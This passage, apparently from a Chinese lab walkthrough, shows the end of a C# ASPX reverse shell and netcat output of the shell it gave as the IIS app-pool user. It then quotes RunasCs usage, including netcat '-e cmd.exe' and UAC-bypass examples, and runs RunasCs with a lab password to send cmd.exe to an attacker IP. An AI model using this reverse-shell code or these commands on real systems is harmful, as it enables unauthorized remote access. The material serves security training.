socketAddress,</span><br><span class="line">                                [In] int socketAddressSize</span><br><span class="line">                                );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   public enum TOKEN_INFORMATION_CLASS</span><br><span class="line">   &#123;</span><br><span class="line">       TokenUser = 1,</span><br><span class="line">       TokenGroups,</span><br><span class="line">       TokenPrivileges,</span><br><span class="line">       TokenOwner,</span><br><span class="line">       TokenPrimaryGroup,</span><br><span class="line">       TokenDefaultDacl,</span><br><span class="line">       TokenSource,</span><br><span class="line">       TokenType,</span><br><span class="line">       TokenImpersonationLevel,</span><br><span class="line">       TokenStatistics,</span><br><span class="line">       TokenRestrictedSids,</span><br><span class="line">       TokenSessionId</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   [DllImport(&quot;advapi32&quot;, CharSet = CharSet.Auto)]</span><br><span class="line">   public static extern bool GetTokenInformation(</span><br><span class="line">       IntPtr hToken,</span><br><span class="line">       TOKEN_INFORMATION_CLASS tokenInfoClass,</span><br><span class="line">       IntPtr TokenInformation,</span><br><span class="line">       int tokeInfoLength,</span><br><span class="line">       ref int reqLength);</span><br><span class="line"></span><br><span class="line">   public enum TOKEN_TYPE</span><br><span class="line">   &#123;</span><br><span class="line">       TokenPrimary = 1,</span><br><span class="line">       TokenImpersonation</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   public enum SECURITY_IMPERSONATION_LEVEL</span><br><span class="line">   &#123;</span><br><span class="line">       SecurityAnonymous,</span><br><span class="line">       SecurityIdentification,</span><br><span class="line">       SecurityImpersonation,</span><br><span class="line">       SecurityDelegation</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">   [DllImport(&quot;advapi32.dll&quot;, EntryPoint = &quot;CreateProcessAsUser&quot;, SetLastError = true, CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]</span><br><span class="line">   public extern static bool CreateProcessAsUser(IntPtr hToken, String lpApplicationName, String lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,</span><br><span class="line">       ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandle, int dwCreationFlags, IntPtr lpEnvironment,</span><br><span class="line">       String lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);</span><br><span class="line"></span><br><span class="line">   [DllImport(&quot;advapi32.dll&quot;, EntryPoint = &quot;DuplicateTokenEx&quot;)]</span><br><span class="line">   public extern static bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess,</span><br><span class="line">       ref SECURITY_ATTRIBUTES lpThreadAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLeve, TOKEN_TYPE TokenType,</span><br><span class="line">       ref IntPtr DuplicateTokenHandle);</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">   const int ERROR_NO_MORE_ITEMS = 259;</span><br><span class="line"></span><br><span class="line">   [StructLayout(LayoutKind.Sequential)]</span><br><span class="line">   struct TOKEN_USER</span><br><span class="line">   &#123;</span><br><span class="line">       public _SID_AND_ATTRIBUTES User;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   [StructLayout(LayoutKind.Sequential)]</span><br><span class="line">   public struct _SID_AND_ATTRIBUTES</span><br><span class="line">   &#123;</span><br><span class="line">       public IntPtr Sid;</span><br><span class="line">       public int Attributes;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   [DllImport(&quot;advapi32&quot;, CharSet = CharSet.Auto)]</span><br><span class="line">   public extern static bool LookupAccountSid</span><br><span class="line">   (</span><br><span class="line">       [In, MarshalAs(UnmanagedType.LPTStr)] string lpSystemName,</span><br><span class="line">       IntPtr pSid,</span><br><span class="line">       StringBuilder Account,</span><br><span class="line">       ref int cbName,</span><br><span class="line">       StringBuilder DomainName,</span><br><span class="line">       ref int cbDomainName,</span><br><span class="line">       ref int peUse </span><br><span class="line"></span><br><span class="line">   );</span><br><span class="line"></span><br><span class="line">   [DllImport(&quot;advapi32&quot;, CharSet = CharSet.Auto)]</span><br><span class="line">   public extern static bool ConvertSidToStringSid(</span><br><span class="line">       IntPtr pSID,</span><br><span class="line">       [In, Out, MarshalAs(UnmanagedType.LPTStr)] ref string pStringSid);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]</span><br><span class="line">   public static extern bool CloseHandle(</span><br><span class="line">       IntPtr hHandle);</span><br><span class="line"></span><br><span class="line">   [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]</span><br><span class="line">   public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwProcessId);</span><br><span class="line">   [Flags]</span><br><span class="line">   public enum ProcessAccessFlags : uint</span><br><span class="line">   &#123;</span><br><span class="line">       All = 0x001F0FFF,</span><br><span class="line">       Terminate = 0x00000001,</span><br><span class="line">       CreateThread = 0x00000002,</span><br><span class="line">       VMOperation = 0x00000008,</span><br><span class="line">       VMRead = 0x00000010,</span><br><span class="line">       VMWrite = 0x00000020,</span><br><span class="line">       DupHandle = 0x00000040,</span><br><span class="line">       SetInformation = 0x00000200,</span><br><span class="line">       QueryInformation = 0x00000400,</span><br><span class="line">       Synchronize = 0x00100000</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   [DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">   static extern IntPtr GetCurrentProcess();</span><br><span class="line"></span><br><span class="line">   [DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">   extern static IntPtr GetCurrentThread();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]</span><br><span class="line">   [return: MarshalAs(UnmanagedType.Bool)]</span><br><span class="line">   static extern bool DuplicateHandle(IntPtr hSourceProcessHandle,</span><br><span class="line">      IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle,</span><br><span class="line">      uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);</span><br><span class="line"></span><br><span class="line">    [DllImport(&quot;psapi.dll&quot;, SetLastError = true)]</span><br><span class="line">    public static extern bool EnumProcessModules(IntPtr hProcess,</span><br><span class="line">    [MarshalAs(UnmanagedType.LPArray, ArraySubType = UnmanagedType.U4)] [In][Out] uint[] lphModule,</span><br><span class="line">    uint cb,</span><br><span class="line">    [MarshalAs(UnmanagedType.U4)] out uint lpcbNeeded);</span><br><span class="line"></span><br><span class="line">    [DllImport(&quot;psapi.dll&quot;)]</span><br><span class="line">    static extern uint GetModuleBaseName(IntPtr hProcess, uint hModule, StringBuilder lpBaseName, uint nSize);</span><br><span class="line"></span><br><span class="line">    public const uint PIPE_ACCESS_OUTBOUND = 0x00000002;</span><br><span class="line">    public const uint PIPE_ACCESS_DUPLEX = 0x00000003;</span><br><span class="line">    public const uint PIPE_ACCESS_INBOUND = 0x00000001;</span><br><span class="line">    public const uint PIPE_WAIT = 0x00000000;</span><br><span class="line">    public const uint PIPE_NOWAIT = 0x00000001;</span><br><span class="line">    public const uint PIPE_READMODE_BYTE = 0x00000000;</span><br><span class="line">    public const uint PIPE_READMODE_MESSAGE = 0x00000002;</span><br><span class="line">    public const uint PIPE_TYPE_BYTE = 0x00000000;</span><br><span class="line">    public const uint PIPE_TYPE_MESSAGE = 0x00000004;</span><br><span class="line">    public const uint PIPE_CLIENT_END = 0x00000000;</span><br><span class="line">    public const uint PIPE_SERVER_END = 0x00000001;</span><br><span class="line">    public const uint PIPE_UNLIMITED_INSTANCES = 255;</span><br><span class="line"></span><br><span class="line">    public const uint NMPWAIT_WAIT_FOREVER = 0xffffffff;</span><br><span class="line">    public const uint NMPWAIT_NOWAIT = 0x00000001;</span><br><span class="line">    public const uint NMPWAIT_USE_DEFAULT_WAIT = 0x00000000;</span><br><span class="line"></span><br><span class="line">    public const uint GENERIC_READ = (0x80000000);</span><br><span class="line">    public const uint GENERIC_WRITE = (0x40000000);</span><br><span class="line">    public const uint GENERIC_EXECUTE = (0x20000000);</span><br><span class="line">    public const uint GENERIC_ALL = (0x10000000);</span><br><span class="line"></span><br><span class="line">    public const uint CREATE_NEW = 1;</span><br><span class="line">    public const uint CREATE_ALWAYS = 2;</span><br><span class="line">    public const uint OPEN_EXISTING = 3;</span><br><span class="line">    public const uint OPEN_ALWAYS = 4;</span><br><span class="line">    public const uint TRUNCATE_EXISTING = 5;</span><br><span class="line"></span><br><span class="line">    public const int INVALID_HANDLE_VALUE = -1;</span><br><span class="line"></span><br><span class="line">    public const ulong ERROR_SUCCESS = 0;</span><br><span class="line">    public const ulong ERROR_CANNOT_CONNECT_TO_PIPE = 2;</span><br><span class="line">    public const ulong ERROR_PIPE_BUSY = 231;</span><br><span class="line">    public const ulong ERROR_NO_DATA = 232;</span><br><span class="line">    public const ulong ERROR_PIPE_NOT_CONNECTED = 233;</span><br><span class="line">    public const ulong ERROR_MORE_DATA = 234;</span><br><span class="line">    public const ulong ERROR_PIPE_CONNECTED = 535;</span><br><span class="line">    public const ulong ERROR_PIPE_LISTENING = 536;</span><br><span class="line"></span><br><span class="line">    [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]</span><br><span class="line">    public static extern IntPtr CreateNamedPipe(</span><br><span class="line">        String lpName,									</span><br><span class="line">        uint dwOpenMode,								</span><br><span class="line">        uint dwPipeMode,								</span><br><span class="line">        uint nMaxInstances,							</span><br><span class="line">        uint nOutBufferSize,						</span><br><span class="line">        uint nInBufferSize,							</span><br><span class="line">        uint nDefaultTimeOut,						</span><br><span class="line">        IntPtr pipeSecurityDescriptor</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]</span><br><span class="line">    public static extern bool ConnectNamedPipe(</span><br><span class="line">        IntPtr hHandle,</span><br><span class="line">        uint lpOverlapped</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    [DllImport(&quot;Advapi32.dll&quot;, SetLastError = true)]</span><br><span class="line">    public static extern bool ImpersonateNamedPipeClient(</span><br><span class="line">        IntPtr hHandle);</span><br><span class="line"></span><br><span class="line">    [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]</span><br><span class="line">    public static extern bool GetNamedPipeHandleState(</span><br><span class="line">        IntPtr hHandle,</span><br><span class="line">        IntPtr lpState,</span><br><span class="line">        IntPtr lpCurInstances,</span><br><span class="line">        IntPtr lpMaxCollectionCount,</span><br><span class="line">        IntPtr lpCollectDataTimeout,</span><br><span class="line">        StringBuilder lpUserName,</span><br><span class="line">        int nMaxUserNameSize</span><br><span class="line">        );</span><br><span class="line"> </span><br><span class="line">    protected void CallbackShell(string server, int port)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        string request = &quot;Spawn Shell...\n&quot;;</span><br><span class="line">        Byte[] bytesSent = Encoding.ASCII.GetBytes(request);</span><br><span class="line"></span><br><span class="line">        IntPtr oursocket = IntPtr.Zero;</span><br><span class="line">        </span><br><span class="line">        sockaddr_in socketinfo;</span><br><span class="line">        oursocket = WSASocket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.IP, IntPtr.Zero, 0, 0);</span><br><span class="line">        socketinfo = new sockaddr_in();</span><br><span class="line">        socketinfo.sin_family = (short) AddressFamily.InterNetwork;</span><br><span class="line">        socketinfo.sin_addr = inet_addr(server);</span><br><span class="line">        socketinfo.sin_port = (short) htons((ushort)port);</span><br><span class="line">        connect(oursocket, ref socketinfo, Marshal.SizeOf(socketinfo));</span><br><span class="line">        send(oursocket, bytesSent, request.Length, 0);</span><br><span class="line">        SpawnProcessAsPriv(oursocket);</span><br><span class="line">        closesocket(oursocket);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected void SpawnProcess(IntPtr oursocket)</span><br><span class="line">    &#123;</span><br><span class="line">        bool retValue;</span><br><span class="line">        string Application = Environment.GetEnvironmentVariable(&quot;comspec&quot;); </span><br><span class="line">        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();</span><br><span class="line">        STARTUPINFO sInfo = new STARTUPINFO();</span><br><span class="line">        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();</span><br><span class="line">        pSec.Length = Marshal.SizeOf(pSec);</span><br><span class="line">        sInfo.dwFlags = 0x00000101;</span><br><span class="line">        sInfo.hStdInput = oursocket;</span><br><span class="line">        sInfo.hStdOutput = oursocket;</span><br><span class="line">        sInfo.hStdError = oursocket;</span><br><span class="line">        retValue = CreateProcess(Application, &quot;&quot;, ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);</span><br><span class="line">        WaitForSingleObject(pInfo.hProcess, (int)INFINITE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected void SpawnProcessAsPriv(IntPtr oursocket)</span><br><span class="line">    &#123;</span><br><span class="line">        bool retValue;</span><br><span class="line">        string Application = Environment.GetEnvironmentVariable(&quot;comspec&quot;); </span><br><span class="line">        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();</span><br><span class="line">        STARTUPINFO sInfo = new STARTUPINFO();</span><br><span class="line">        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();</span><br><span class="line">        pSec.Length = Marshal.SizeOf(pSec);</span><br><span class="line">        sInfo.dwFlags = 0x00000101; </span><br><span class="line">        IntPtr DupeToken = new IntPtr(0);</span><br><span class="line">        sInfo.hStdInput = oursocket;</span><br><span class="line">        sInfo.hStdOutput = oursocket;</span><br><span class="line">        sInfo.hStdError = oursocket;</span><br><span class="line">        if (DupeToken == IntPtr.Zero)</span><br><span class="line">            retValue = CreateProcess(Application, &quot;&quot;, ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);</span><br><span class="line">        else</span><br><span class="line">            retValue = CreateProcessAsUser(DupeToken, Application, &quot;&quot;, ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);</span><br><span class="line">        WaitForSingleObject(pInfo.hProcess, (int)INFINITE);</span><br><span class="line">        CloseHandle(DupeToken);</span><br><span class="line">    &#125;</span><br><span class="line">    &lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410281503786.jpg" /></p>
<p>获得 <code>iis apppool\defaultapppool</code> 用户权限的 Shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># nc -nvlp 443                </span></span><br><span class="line">listening on [any] 443 ...</span><br><span class="line">connect to [10.0.3.28] from (UNKNOWN) [10.0.3.30] 49670</span><br><span class="line">Spawn Shell...</span><br><span class="line">Microsoft Windows [Versi�n 10.0.17763.107]</span><br><span class="line">(c) 2018 Microsoft Corporation. Todos los derechos reservados.</span><br><span class="line"></span><br><span class="line">c:\windows\system32\inetsrv&gt;<span class="built_in">whoami</span> /all</span><br><span class="line"><span class="built_in">whoami</span> /all</span><br><span class="line"></span><br><span class="line">INFORMACI�N DE USUARIO</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Nombre de usuario          SID                                                          </span><br><span class="line">========================== =============================================================</span><br><span class="line">iis apppool\defaultapppool S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">INFORMACI�N DE GRUPO</span><br><span class="line">--------------------</span><br><span class="line"></span><br><span class="line">Nombre de grupo                             Tipo               SID          Atributos                                                               </span><br><span class="line">=========================================== ================== ============ ========================================================================</span><br><span class="line">Etiqueta obligatoria\Nivel obligatorio alto Etiqueta           S-1-16-12288                                                                         </span><br><span class="line">Todos                                       Grupo conocido     S-1-1-0      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">BUILTIN\Usuarios                            Alias              S-1-5-32-545 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">NT AUTHORITY\SERVICIO                       Grupo conocido     S-1-5-6      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">INICIO DE SESI�N EN LA CONSOLA              Grupo conocido     S-1-2-1      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">NT AUTHORITY\Usuarios autentificados        Grupo conocido     S-1-5-11     Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">NT AUTHORITY\Esta compa��a                  Grupo conocido     S-1-5-15     Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">BUILTIN\IIS_IUSRS                           Alias              S-1-5-32-568 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">LOCAL                                       Grupo conocido     S-1-2-0      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">                                            Tipo SID no v�lido S-1-5-82-0   Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">INFORMACI�N DE PRIVILEGIOS</span><br><span class="line">--------------------------</span><br><span class="line"></span><br><span class="line">Nombre de privilegio          Descripci�n                                       Estado       </span><br><span class="line">============================= ================================================= =============</span><br><span class="line">SeAssignPrimaryTokenPrivilege Reemplazar un s�mbolo (token) de nivel de proceso Deshabilitado</span><br><span class="line">SeIncreaseQuotaPrivilege      Ajustar las cuotas de la memoria para un proceso  Deshabilitado</span><br><span class="line">SeAuditPrivilege              Generar auditor�as de seguridad                   Deshabilitado</span><br><span class="line">SeChangeNotifyPrivilege       Omitir comprobaci�n de recorrido                  Habilitada   </span><br><span class="line">SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci�n      Habilitada   </span><br><span class="line">SeCreateGlobalPrivilege       Crear objetos globales                            Habilitada   </span><br><span class="line">SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso      Deshabilitado</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c:\windows\system32\inetsrv&gt;</span><br></pre></td></tr></table></figure>
<h3 id="提权至-marcos">2.2. 提权至 marcos</h3>
<p>由于已经知道 marcos 的密码并且由SMB扫描来看SMB的权限似乎要比 bogo
的权限高，为此可尝试利用 RunasCs【<a
target="_blank" rel="noopener" href="https://github.com/antonioCoco/RunasCs">GitHub -
antonioCoco/RunasCs: RunasCs - Csharp and open version of windows
builtin runas.exe</a>】进一步提权至 marcos 用户看看</p>
<blockquote>
<p><em>RunasCs</em> is an utility to run specific processes with
different permissions than the user's current logon provides using
explicit credentials. This tool is an improved and open version of
windows builtin <em>runas.exe</em> that solves some limitations:</p>
<ul>
<li>Allows explicit credentials</li>
<li>Works both if spawned from interactive process and from service
process</li>
<li>Manage properly <em>DACL</em> for <em>Window
Stations</em> and <em>Desktop</em> for the creation of the new
process</li>
<li>Uses more reliable create process functions
like <code>CreateProcessAsUser()</code> and <code>CreateProcessWithTokenW()</code> if
the calling process holds the required privileges (automatic
detection)</li>
<li>Allows to specify the logon type, e.g. 8-NetworkCleartext logon
(no <em>UAC</em> limitations)</li>
<li>Allows to bypass UAC when an administrator password is known (flag
--bypass-uac)</li>
<li>Allows to create a process with the main thread impersonating the
requested user (flag --remote-impersonation)</li>
<li>Allows
redirecting <em>stdin</em>, <em>stdout</em> and <em>stderr</em> to a
remote host</li>
<li>It's Open Source :)</li>
</ul>
<p><em>RunasCs</em> has an automatic detection to determine the best
create process function for every contexts. Based on the process caller
token permissions, it will use one of the create process function in the
following preferred order:</p>
<ol type="1">
<li><code>CreateProcessAsUserW()</code></li>
<li><code>CreateProcessWithTokenW()</code></li>
<li><code>CreateProcessWithLogonW()</code></li>
</ol>
</blockquote>
<p>简言之，在 A 用户下通过提供 B 用户的凭证可以创建运行 B
用户权限的特定进程【提权】</p>
<p>Usage</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">RunasCs v1.5 - @splinter_code</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">    RunasCs.exe username password cmd [-d domain] [-f create_process_function] [-l logon_type] [-r host:port] [-t process_timeout] [--force-profile] [--bypass-uac] [--remote-impersonation]</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">    RunasCs is an utility to run specific processes under a different user account</span><br><span class="line">    by specifying explicit credentials. In contrast to the default runas.exe <span class="built_in">command</span></span><br><span class="line">    it supports different logon types and CreateProcess* <span class="built_in">functions</span> to be used, depending</span><br><span class="line">    on your current permissions. Furthermore it allows input/output redirection (even</span><br><span class="line">    to remote hosts) and you can specify the password directly on the <span class="built_in">command</span> line.</span><br><span class="line"></span><br><span class="line">Positional arguments:</span><br><span class="line">    username                username of the user</span><br><span class="line">    password                password of the user</span><br><span class="line">    cmd                     commandline <span class="keyword">for</span> the process</span><br><span class="line"></span><br><span class="line">Optional arguments:</span><br><span class="line">    -d, --domain domain</span><br><span class="line">                            domain of the user, <span class="keyword">if</span> <span class="keyword">in</span> a domain.</span><br><span class="line">                            Default: <span class="string">&quot;&quot;</span></span><br><span class="line">    -f, --<span class="keyword">function</span> create_process_function</span><br><span class="line">                            CreateProcess <span class="keyword">function</span> to use. When not specified</span><br><span class="line">                            RunasCs determines an appropriate CreateProcess</span><br><span class="line">                            <span class="keyword">function</span> automatically according to your privileges.</span><br><span class="line">                            0 - CreateProcessAsUserW</span><br><span class="line">                            1 - CreateProcessWithTokenW</span><br><span class="line">                            2 - CreateProcessWithLogonW</span><br><span class="line">    -l, --logon-type logon_type</span><br><span class="line">                            the logon <span class="built_in">type</span> <span class="keyword">for</span> the token of the new process.</span><br><span class="line">                            Default: <span class="string">&quot;2&quot;</span> - Interactive</span><br><span class="line">    -t, --<span class="built_in">timeout</span> process_timeout</span><br><span class="line">                            the waiting time (<span class="keyword">in</span> ms) <span class="keyword">for</span> the created process.</span><br><span class="line">                            This will halt RunasCs <span class="keyword">until</span> the spawned process</span><br><span class="line">                            ends and sent the output back to the <span class="built_in">caller</span>.</span><br><span class="line">                            If you <span class="built_in">set</span> 0 no output will be retrieved and a</span><br><span class="line">                            background process will be created.</span><br><span class="line">                            Default: <span class="string">&quot;120000&quot;</span></span><br><span class="line">    -r, --remote host:port</span><br><span class="line">                            redirect stdin, stdout and stderr to a remote host.</span><br><span class="line">                            Using this option sets the process_timeout to 0.</span><br><span class="line">    -p, --force-profile</span><br><span class="line">                            force the creation of the user profile on the machine.</span><br><span class="line">                            This will ensure the process will have the</span><br><span class="line">                            environment variables correctly <span class="built_in">set</span>.</span><br><span class="line">                            WARNING: If non-existent, it creates the user profile</span><br><span class="line">                            directory <span class="keyword">in</span> the C:\Users folder.</span><br><span class="line">    -b, --bypass-uac</span><br><span class="line">                            try a UAC bypass to spawn a process without</span><br><span class="line">                            token limitations (not filtered).</span><br><span class="line">    -i, --remote-impersonation</span><br><span class="line">                            spawn a new process and assign the token of the</span><br><span class="line">                            logged on user to the main thread.</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">    Run a <span class="built_in">command</span> as a <span class="built_in">local</span> user</span><br><span class="line">        RunasCs.exe user1 password1 <span class="string">&quot;cmd /c whoami /all&quot;</span></span><br><span class="line">    Run a <span class="built_in">command</span> as a domain user and logon <span class="built_in">type</span> as NetworkCleartext (8)</span><br><span class="line">        RunasCs.exe user1 password1 <span class="string">&quot;cmd /c whoami /all&quot;</span> -d domain -l 8</span><br><span class="line">    Run a background process as a <span class="built_in">local</span> user,</span><br><span class="line">        RunasCs.exe user1 password1 <span class="string">&quot;C:\tmp\nc.exe 10.10.10.10 4444 -e cmd.exe&quot;</span> -t 0</span><br><span class="line">    Redirect stdin, stdout and stderr of the specified <span class="built_in">command</span> to a remote host</span><br><span class="line">        RunasCs.exe user1 password1 cmd.exe -r 10.10.10.10:4444</span><br><span class="line">    Run a <span class="built_in">command</span> simulating the /netonly flag of runas.exe</span><br><span class="line">        RunasCs.exe user1 password1 <span class="string">&quot;cmd /c whoami /all&quot;</span> -l 9</span><br><span class="line">    Run a <span class="built_in">command</span> as an Administrator bypassing UAC</span><br><span class="line">        RunasCs.exe adm1 password1 <span class="string">&quot;cmd /c whoami /priv&quot;</span> --bypass-uac</span><br><span class="line">    Run a <span class="built_in">command</span> as an Administrator through remote impersonation</span><br><span class="line">        RunasCs.exe adm1 password1 <span class="string">&quot;cmd /c echo admin &gt; C:\Windows\admin&quot;</span> -l 8 --remote-impersonation</span><br></pre></td></tr></table></figure>
<p>Kali 开个监听，利用 RunasCs 往 Kali 重定向个 cmd【RunasCs 依旧利用
SMB 传至靶机】</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">c:\inetpub\wwwroot&gt;<span class="built_in">dir</span> </span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> El volumen de la unidad C no tiene etiqueta.</span><br><span class="line"> El n�mero de serie del volumen es: 26CD-AE41</span><br><span class="line"></span><br><span class="line"> Directorio de c:\inetpub\wwwroot</span><br><span class="line"></span><br><span class="line">28/10/2024  11:08    &lt;DIR&gt;          .</span><br><span class="line">28/10/2024  11:08    &lt;DIR&gt;          ..</span><br><span class="line">08/10/2023  22:22    &lt;DIR&gt;          03-comming-soon</span><br><span class="line">08/10/2023  20:46    &lt;DIR&gt;          aspnet_client</span><br><span class="line">08/10/2023  22:14    &lt;DIR&gt;          common-js</span><br><span class="line">08/10/2023  22:14    &lt;DIR&gt;          fonts</span><br><span class="line">08/10/2023  22:14    &lt;DIR&gt;          images</span><br><span class="line">28/10/2024  10:28             1.582 index.html</span><br><span class="line">28/10/2024  03:55            15.967 reverse.aspx</span><br><span class="line">28/10/2024  03:44             2.894 reverse_shell.aspx</span><br><span class="line">19/05/2023  23:37            51.712 RunasCs.exe</span><br><span class="line">28/10/2024  10:40               219 test.aspx</span><br><span class="line">               5 archivos         72.374 bytes</span><br><span class="line">               7 <span class="built_in">dirs</span>  45.243.736.064 bytes libres</span><br><span class="line"></span><br><span class="line">c:\inetpub\wwwroot&gt;c:\inetpub\wwwroot\RunasCs.exe marcos SuperPassword cmd.exe -r 10.0.3.28:4444</span><br><span class="line">c:\inetpub\wwwroot\RunasCs.exe marcos SuperPassword cmd.exe -r 10.0.3.28:4444</span><br><span class="line">[*] 